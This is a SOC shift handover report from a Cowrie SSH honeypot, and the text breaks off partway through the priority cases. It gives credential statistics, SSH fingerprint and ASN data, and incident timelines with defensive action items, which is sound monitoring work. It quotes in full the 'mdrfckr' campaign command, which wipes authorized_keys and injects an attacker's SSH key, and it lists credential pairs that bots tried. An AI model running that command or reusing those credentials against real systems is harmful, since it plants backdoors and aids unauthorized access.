# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-20 |
| **Generated At** | 2026-07-20T14:15:11Z |
| **Shift Time** | 14:15 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **141** |
| Confirmed Threats | **124** |
| False Positives Filtered | **17** (12.1%) |
| Unique Attacker IPs | **89** |
| Countries of Origin | **27** |
| High Severity Cases | **87** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **54** |
| Malware Samples Analyzed | **2** HIGH · **31** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **112** |
| Unique Credential Pairs | **60** |
| Unique Usernames | **37** |
| Unique Passwords | **53** |
| Successful Auth Pairs | **96** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 27 |
| `ubnt` | 14 |
| `support` | 9 |
| `admin` | 5 |
| `unknown` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 6 |
| `linux` | 5 |
| `root` | 5 |
| `1234567890` | 5 |
| `admin` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 6 |
| `root` | `linux` | 5 |
| `root` | `1234567890` | 5 |
| `345gs5662d34` | `345gs5662d34` | 4 |
| `admin` | `` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `user` | `user2010` | `217.24.185.98` | 2026-07-20T10:55:33 |
| `li` | `li` | `101.50.83.146` | 2026-07-20T10:55:36 |
| `zhang` | `zhang` | `101.50.83.146` | 2026-07-20T10:58:21 |
| `wang` | `wang` | `101.50.83.146` | 2026-07-20T11:00:59 |
| `john` | `a` | `103.143.239.167` | 2026-07-20T11:02:27 |
| `345gs5662d34` | `345gs5662d34` | `103.143.239.167` | 2026-07-20T11:02:29 |
| `john` | `3245gs5662d34` | `103.143.239.167` | 2026-07-20T11:02:30 |
| `yang` | `yang` | `101.50.83.146` | 2026-07-20T11:03:37 |
| `test` | `asdfgh` | `203.193.147.37` | 2026-07-20T11:03:48 |
| `test` | `asdfgh` | `103.250.160.76` | 2026-07-20T11:03:57 |
| `root` | `linux` | `36.74.219.125` | 2026-07-20T11:05:35 |
| `root` | `linux` | `111.70.23.240` | 2026-07-20T11:05:48 |
| `liu` | `liu` | `101.50.83.146` | 2026-07-20T11:06:08 |
| `xu` | `xu` | `101.50.83.146` | 2026-07-20T11:08:49 |
| `root` | `linux` | `101.51.52.111` | 2026-07-20T11:08:57 |
| `root` | `linux` | `203.252.10.3` | 2026-07-20T11:09:11 |
| `root` | `linux` | `10.0.0.73` | 2026-07-20T11:09:21 |
| `zhou` | `zhou` | `101.50.83.146` | 2026-07-20T11:11:33 |
| `debian` | `qwerty123456` | `187.8.120.90` | 2026-07-20T11:12:29 |
| `sun` | `sun` | `101.50.83.146` | 2026-07-20T11:14:17 |
| `bureau` | `bureau` | `101.50.83.146` | 2026-07-20T11:17:00 |
| `default` | `121212` | `60.12.5.190` | 2026-07-20T11:18:59 |
| `default` | `121212` | `10.0.0.73` | 2026-07-20T11:19:21 |
| `butter` | `xuelpt` | `101.50.83.146` | 2026-07-20T11:19:33 |
| `byte` | `byte` | `101.50.83.146` | 2026-07-20T11:22:11 |
| `byte` | `linuxbyte` | `101.50.83.146` | 2026-07-20T11:24:49 |
| `asta` | `asta` | `190.181.27.27` | 2026-07-20T11:26:47 |
| `345gs5662d34` | `345gs5662d34` | `190.181.27.27` | 2026-07-20T11:26:50 |
| `asta` | `3245gs5662d34` | `190.181.27.27` | 2026-07-20T11:26:51 |
| `cat` | `cat` | `101.50.83.146` | 2026-07-20T11:27:34 |
| `support` | `support` | `176.53.159.196` | 2026-07-20T11:29:50 |
| `ubnt` | `root` | `45.178.227.0` | 2026-07-20T11:30:05 |
| `cehost` | `cehost` | `101.50.83.146` | 2026-07-20T11:30:20 |
| `support` | `support` | `10.0.0.73` | 2026-07-20T11:31:08 |
| `cehost` | `root` | `101.50.83.146` | 2026-07-20T11:32:58 |
| `ubnt` | `root` | `10.0.0.73` | 2026-07-20T11:33:55 |
| `root` | `vodafone` | `10.0.0.73` | 2026-07-20T11:35:06 |
| `cgadmin` | `cgadmin` | `101.50.83.146` | 2026-07-20T11:35:35 |
| `root` | `vodafone` | `185.242.3.195` | 2026-07-20T11:36:28 |
| `support` | `987654321` | `123.212.9.122` | 2026-07-20T11:37:15 |
| `support` | `987654321` | `182.225.134.13` | 2026-07-20T11:37:23 |
| `chrome` | `chrome` | `101.50.83.146` | 2026-07-20T11:38:10 |
| `config` | `P@ssw0rd` | `185.81.94.58` | 2026-07-20T11:39:04 |
| `root` | `﻿------fuck------` | `114.96.79.13` | 2026-07-20T11:39:56 |
| `cooper` | `cooper` | `101.50.83.146` | 2026-07-20T11:40:53 |
| `support` | `987654321` | `10.0.0.73` | 2026-07-20T11:41:08 |
| `config` | `P@ssw0rd` | `222.186.68.153` | 2026-07-20T11:42:29 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-20T11:43:13 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-20T11:43:13 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-20T11:43:17 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-20T11:43:17 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-20T11:43:18 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-20T11:43:23 |
| `cpanel` | `cpanel` | `101.50.83.146` | 2026-07-20T11:43:36 |
| `content` | `content123` | `185.242.3.195` | 2026-07-20T11:44:01 |
| `cron` | `cron` | `101.50.83.146` | 2026-07-20T11:46:19 |
| `csgo` | `csgoserver` | `101.50.83.146` | 2026-07-20T11:49:00 |
| `csgoserver` | `csgoserver` | `101.50.83.146` | 2026-07-20T11:51:35 |
| `unknown` | `unknown1` | `178.178.222.55` | 2026-07-20T11:53:03 |
| `ubnt` | `3333333` | `49.206.201.253` | 2026-07-20T11:54:57 |
| `root` | `a123123123` | `125.142.37.91` | 2026-07-20T11:55:05 |
| `345gs5662d34` | `345gs5662d34` | `125.142.37.91` | 2026-07-20T11:55:09 |
| `root` | `3245gs5662d34` | `125.142.37.91` | 2026-07-20T11:55:10 |
| `ubnt` | `3333333` | `59.46.182.10` | 2026-07-20T11:58:26 |
| `ubnt` | `3333333` | `10.0.0.73` | 2026-07-20T11:58:51 |
| `nobody` | `letmein` | `220.134.25.203` | 2026-07-20T12:02:32 |
| `nobody` | `letmein` | `196.191.142.67` | 2026-07-20T12:02:44 |
| `ubnt` | `webmaster` | `187.8.120.90` | 2026-07-20T12:05:16 |
| `ubnt` | `webmaster` | `10.0.0.73` | 2026-07-20T12:05:38 |
| `nobody` | `letmein` | `10.0.0.73` | 2026-07-20T12:06:14 |
| `chris` | `1234` | `213.176.16.218` | 2026-07-20T12:10:47 |
| `345gs5662d34` | `345gs5662d34` | `213.176.16.218` | 2026-07-20T12:10:49 |
| `chris` | `3245gs5662d34` | `213.176.16.218` | 2026-07-20T12:10:50 |
| `root` | `1234567890` | `200.89.159.59` | 2026-07-20T12:14:26 |
| `root` | `1234567890` | `91.144.158.62` | 2026-07-20T12:14:33 |
| `root` | `1234567890` | `115.245.122.146` | 2026-07-20T12:17:50 |
| `root` | `1234567890` | `202.82.20.241` | 2026-07-20T12:17:58 |
| `root` | `1234567890` | `10.0.0.73` | 2026-07-20T12:18:14 |
| `root` | `welcome1` | `218.95.73.31` | 2026-07-20T12:23:01 |
| `root` | `welcome1` | `213.33.204.130` | 2026-07-20T12:23:09 |
| `ubnt` | `ubnt2021` | `37.25.36.197` | 2026-07-20T12:26:01 |
| `ubnt` | `ubnt2021` | `103.93.37.178` | 2026-07-20T12:26:14 |
| `debian` | `123qwe` | `177.72.87.7` | 2026-07-20T12:26:41 |
| `debian` | `123qwe` | `116.113.241.82` | 2026-07-20T12:26:54 |
| `content` | `content123` | `10.0.0.73` | 2026-07-20T12:28:46 |
| `ubnt` | `ubnt2021` | `220.122.115.9` | 2026-07-20T12:29:04 |
| `ubnt` | `ubnt2021` | `10.0.0.73` | 2026-07-20T12:29:34 |
| `debian` | `123qwe` | `222.117.176.58` | 2026-07-20T12:30:09 |
| `admin` | `admin` | `47.85.8.171` | 2026-07-20T12:36:48 |
| `root` | `Pass@word!123` | `185.242.3.195` | 2026-07-20T12:37:53 |
| `guest` | `guest888` | `80.15.223.148` | 2026-07-20T12:42:35 |
| `guest` | `guest888` | `213.154.80.51` | 2026-07-20T12:42:42 |
| `guest` | `guest888` | `10.0.0.73` | 2026-07-20T12:42:57 |
| `unknown` | `admin` | `179.184.218.49` | 2026-07-20T12:52:31 |
| `unknown` | `admin` | `62.201.212.54` | 2026-07-20T12:52:42 |
| `unknown` | `admin` | `10.0.0.73` | 2026-07-20T12:52:54 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **141** |
| Sessions with Fingerprint | **10** |
| Unique HASSH Fingerprints | **10** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 36 |
| Go SSH scanner | 34 |
| libssh | 23 |
| Paramiko (Python) | 8 |
| Perl Net::SSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 36 | 35 |
| `16443846184e...` | Generic scanner | 27 | 2 |
| `f555226df196...` | Mirai/variant | 12 | 4 |
| `a2de0f306611...` | Mirai/variant | 8 | 2 |
| `eff4c24daffc...` | Modern SSH client | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 36 | 35 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 27 | 2 | Generic scanner |
| `f555226df196...` | libssh | 12 | 4 | Mirai/variant |
| `95420f9d932d...` | libssh | 11 | 7 | — |
| `a2de0f306611...` | Paramiko (Python) | 8 | 2 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `213.176.16.218`, `125.142.37.91`, `103.143.239.167`, `190.181.27.27`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **89** |
| Unique ASNs | **61** |
| High-Risk ASNs | **56** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 7 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 7 | HIGH |
| `AS213412` | ONYPHE SAS | 5 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS22773` | Cox Communications Inc. | 3 | MEDIUM |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS10030` | Celcom Axiata Berhad | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (87)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-72ec96320e51

| Field | Detail |
|---|---|
| **Source IP** | `217.24.185[.]98` |
| **First Seen** | 2026-07-20 10:55 |
| **Last Seen** | 2026-07-20 10:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 10:55:32` | `cowrie.session.connect` |
| `2026-07-20 10:55:32` | `cowrie.client.version` |
| `2026-07-20 10:55:32` | `cowrie.client.kex` |
| `2026-07-20 10:55:33` | `cowrie.login.success` |
| `2026-07-20 10:55:34` | `cowrie.direct-tcpip.request` |
| `2026-07-20 10:55:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.24.185[.]98` to AbuseIPDB if not already reported
- [ ] Block `217.24.185[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbaa57daa9e5

| Field | Detail |
|---|---|
| **Source IP** | `101.50.83[.]146` |
| **First Seen** | 2026-07-20 10:55 |
| **Last Seen** | 2026-07-20 10:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 10:55:35` | `cowrie.session.connect` |
| `2026-07-20 10:55:35` | `cowrie.client.version` |
| `2026-07-20 10:55:35` | `cowrie.client.kex` |
| `2026-07-20 10:55:36` | `cowrie.login.success` |
| `2026-07-20 10:55:37` | `cowrie.session.params` |
| `2026-07-20 10:55:37` | `cowrie.command.input` |
| `2026-07-20 10:55:37` | `cowrie.log.closed` |
| `2026-07-20 10:55:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.50.83[.]146` to AbuseIPDB if not already reported
- [ ] Block `101.50.83[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a607065cb2b

| Field | Detail |
|---|---|
| **Source IP** | `101.50.83[.]146` |
| **First Seen** | 2026-07-20 10:58 |
| **Last Seen** | 2026-07-20 10:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 10:58:20` | `cowrie.session.connect` |
| `2026-07-20 10:58:20` | `cowrie.client.version` |
| `2026-07-20 10:58:20` | `cowrie.client.kex` |
| `2026-07-20 10:58:21` | `cowrie.login.success` |
| `2026-07-20 10:58:22` | `cowrie.session.params` |
| `2026-07-20 10:58:22` | `cowrie.command.input` |
| `2026-07-20 10:58:22` | `cowrie.log.closed` |
| `2026-07-20 10:58:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.50.83[.]146` to AbuseIPDB if not already reported
- [ ] Block `101.50.83[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe6b059ee52b

| Field | Detail |
|---|---|
| **Source IP** | `101.50.83[.]146` |
| **First Seen** | 2026-07-20 11:00 |
| **Last Seen** | 2026-07-20 11:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:00:58` | `cowrie.session.connect` |
| `2026-07-20 11:00:58` | `cowrie.client.version` |
| `2026-07-20 11:00:58` | `cowrie.client.kex` |
| `2026-07-20 11:00:59` | `cowrie.login.success` |
| `2026-07-20 11:01:00` | `cowrie.session.params` |
| `2026-07-20 11:01:00` | `cowrie.command.input` |
| `2026-07-20 11:01:00` | `cowrie.log.closed` |
| `2026-07-20 11:01:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.50.83[.]146` to AbuseIPDB if not already reported
- [ ] Block `101.50.83[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-795eeb5400df

| Field | Detail |
|---|---|
| **Source IP** | `103.143.239[.]167` |
| **First Seen** | 2026-07-20 11:02 |
| **Last Seen** | 2026-07-20 11:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:02:27` | `cowrie.session.connect` |
| `2026-07-20 11:02:27` | `cowrie.client.version` |
| `2026-07-20 11:02:27` | `cowrie.client.kex` |
| `2026-07-20 11:02:27` | `cowrie.login.success` |
| `2026-07-20 11:02:28` | `cowrie.session.params` |
| `2026-07-20 11:02:28` | `cowrie.command.input` |
| `2026-07-20 11:02:28` | `cowrie.command.failed` |
| `2026-07-20 11:02:28` | `cowrie.log.closed` |
| `2026-07-20 11:02:29` | `cowrie.session.params` |
| `2026-07-20 11:02:29` | `cowrie.command.input` |
| `2026-07-20 11:02:29` | `cowrie.session.file_download` |
| `2026-07-20 11:02:29` | `cowrie.log.closed` |
| `2026-07-20 11:02:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.239[.]167` to AbuseIPDB if not already reported
- [ ] Block `103.143.239[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d8594f726a7

| Field | Detail |
|---|---|
| **Source IP** | `103.143.239[.]167` |
| **First Seen** | 2026-07-20 11:02 |
| **Last Seen** | 2026-07-20 11:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:02:29` | `cowrie.session.connect` |
| `2026-07-20 11:02:29` | `cowrie.client.version` |
| `2026-07-20 11:02:29` | `cowrie.client.kex` |
| `2026-07-20 11:02:29` | `cowrie.login.success` |
| `2026-07-20 11:02:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.239[.]167` to AbuseIPDB if not already reported
- [ ] Block `103.143.239[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b430da773a44

| Field | Detail |
|---|---|
| **Source IP** | `103.143.239[.]167` |
| **First Seen** | 2026-07-20 11:02 |
| **Last Seen** | 2026-07-20 11:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:02:29` | `cowrie.session.connect` |
| `2026-07-20 11:02:29` | `cowrie.client.version` |
| `2026-07-20 11:02:29` | `cowrie.client.kex` |
| `2026-07-20 11:02:30` | `cowrie.login.success` |
| `2026-07-20 11:02:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.239[.]167` to AbuseIPDB if not already reported
- [ ] Block `103.143.239[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8b4faba559d

| Field | Detail |
|---|---|
| **Source IP** | `101.50.83[.]146` |
| **First Seen** | 2026-07-20 11:03 |
| **Last Seen** | 2026-07-20 11:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:03:36` | `cowrie.session.connect` |
| `2026-07-20 11:03:36` | `cowrie.client.version` |
| `2026-07-20 11:03:36` | `cowrie.client.kex` |
| `2026-07-20 11:03:37` | `cowrie.login.success` |
| `2026-07-20 11:03:38` | `cowrie.session.params` |
| `2026-07-20 11:03:38` | `cowrie.command.input` |
| `2026-07-20 11:03:38` | `cowrie.log.closed` |
| `2026-07-20 11:03:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.50.83[.]146` to AbuseIPDB if not already reported
- [ ] Block `101.50.83[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e383c29a423

| Field | Detail |
|---|---|
| **Source IP** | `203.193.147[.]37` |
| **First Seen** | 2026-07-20 11:03 |
| **Last Seen** | 2026-07-20 11:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:03:45` | `cowrie.session.connect` |
| `2026-07-20 11:03:45` | `cowrie.client.version` |
| `2026-07-20 11:03:45` | `cowrie.client.kex` |
| `2026-07-20 11:03:48` | `cowrie.login.success` |
| `2026-07-20 11:03:49` | `cowrie.direct-tcpip.request` |
| `2026-07-20 11:03:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.193.147[.]37` to AbuseIPDB if not already reported
- [ ] Block `203.193.147[.]37` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1195a1d3c991

| Field | Detail |
|---|---|
| **Source IP** | `103.250.160[.]76` |
| **First Seen** | 2026-07-20 11:03 |
| **Last Seen** | 2026-07-20 11:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:03:54` | `cowrie.session.connect` |
| `2026-07-20 11:03:55` | `cowrie.client.version` |
| `2026-07-20 11:03:55` | `cowrie.client.kex` |
| `2026-07-20 11:03:57` | `cowrie.login.success` |
| `2026-07-20 11:03:57` | `cowrie.direct-tcpip.request` |
| `2026-07-20 11:04:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.250.160[.]76` to AbuseIPDB if not already reported
- [ ] Block `103.250.160[.]76` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbf00917103a

| Field | Detail |
|---|---|
| **Source IP** | `36.74.219[.]125` |
| **First Seen** | 2026-07-20 11:05 |
| **Last Seen** | 2026-07-20 11:05 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:05:31` | `cowrie.session.connect` |
| `2026-07-20 11:05:32` | `cowrie.client.version` |
| `2026-07-20 11:05:32` | `cowrie.client.kex` |
| `2026-07-20 11:05:35` | `cowrie.login.success` |
| `2026-07-20 11:05:36` | `cowrie.direct-tcpip.request` |
| `2026-07-20 11:05:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.74.219[.]125` to AbuseIPDB if not already reported
- [ ] Block `36.74.219[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab55b8244093

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]240` |
| **First Seen** | 2026-07-20 11:05 |
| **Last Seen** | 2026-07-20 11:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:05:46` | `cowrie.session.connect` |
| `2026-07-20 11:05:46` | `cowrie.client.version` |
| `2026-07-20 11:05:46` | `cowrie.client.kex` |
| `2026-07-20 11:05:48` | `cowrie.login.success` |
| `2026-07-20 11:05:49` | `cowrie.direct-tcpip.request` |
| `2026-07-20 11:05:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]240` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]240` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5345962d1dd2

| Field | Detail |
|---|---|
| **Source IP** | `101.50.83[.]146` |
| **First Seen** | 2026-07-20 11:06 |
| **Last Seen** | 2026-07-20 11:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:06:07` | `cowrie.session.connect` |
| `2026-07-20 11:06:07` | `cowrie.client.version` |
| `2026-07-20 11:06:08` | `cowrie.client.kex` |
| `2026-07-20 11:06:08` | `cowrie.login.success` |
| `2026-07-20 11:06:09` | `cowrie.session.params` |
| `2026-07-20 11:06:09` | `cowrie.command.input` |
| `2026-07-20 11:06:10` | `cowrie.log.closed` |
| `2026-07-20 11:06:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.50.83[.]146` to AbuseIPDB if not already reported
- [ ] Block `101.50.83[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ae622b7ff85

| Field | Detail |
|---|---|
| **Source IP** | `101.50.83[.]146` |
| **First Seen** | 2026-07-20 11:08 |
| **Last Seen** | 2026-07-20 11:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-20 11:08:48` | `cowrie.session.connect` |
| `2026-07-20 11:08:48` | `cowrie.client.version` |
| `2026-07-20 11:08:48` | `cowrie.client.kex` |
| `2026-07-20 11:08:49` | `cowrie.login.success` |
| `2026-07-20 11:08:50` | `cowrie.session.params` |
